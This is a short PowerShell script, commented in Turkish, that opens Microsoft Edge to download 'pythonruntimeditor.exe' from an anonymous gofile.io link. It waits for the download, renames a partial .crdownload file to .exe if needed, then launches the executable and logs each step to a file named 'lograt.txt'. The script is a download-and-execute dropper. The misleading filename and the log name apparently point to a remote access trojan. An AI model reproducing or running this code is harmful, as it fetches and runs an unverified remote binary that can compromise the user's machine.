# Ayarlar
$url = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$downloadFolder = "$env:USERPROFILE\Downloads"
$expectedFileName = "pythonruntimeditor.exe"
$crdownloadName = "$expectedFileName.crdownload"
$exePath = Join-Path $downloadFolder $expectedFileName
$crPath = Join-Path $downloadFolder $crdownloadName
$logFile = "$downloadFolder\lograt.txt"

function Log-Message {
    param([string]$msg)
    Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg")
}

# 1. Tarayıcıyı aç
Start-Process "msedge.exe" $url
Log-Message "Tarayıcı açıldı, indirme başlatıldı. Bekleniyor..."

# 2. Dosya tam inene kadar bekle (maksimum 60 saniye)
$timeout = 60
$elapsed = 0

while ($elapsed -lt $timeout) {
    if (Test-Path $exePath) {
        Log-Message "Dosya tamamen indi: $expectedFileName"
        break
    }
    Start-Sleep -Seconds 1
    $elapsed++
}

# 3. Hâlâ .exe yoksa .crdownload'ı kontrol et
if (-not (Test-Path $exePath) -and (Test-Path $crPath)) {
    Log-Message ".exe yok ama .crdownload var. Yeniden adlandırılıyor..."
    Rename-Item -Path $crPath -NewName $expectedFileName
}

# 4. Dosya şimdi var mı? Varsa çalıştır, yoksa ağla :(
if (Test-Path $exePath) {
    Log-Message "Dosya çalıştırılıyor..."
    Start-Process -FilePath $exePath -WindowStyle Normal
} else {
    Log-Message "HATA: Dosya bulunamadı ya da bozuk indirildi. Kullanıcı el atsın!"
}
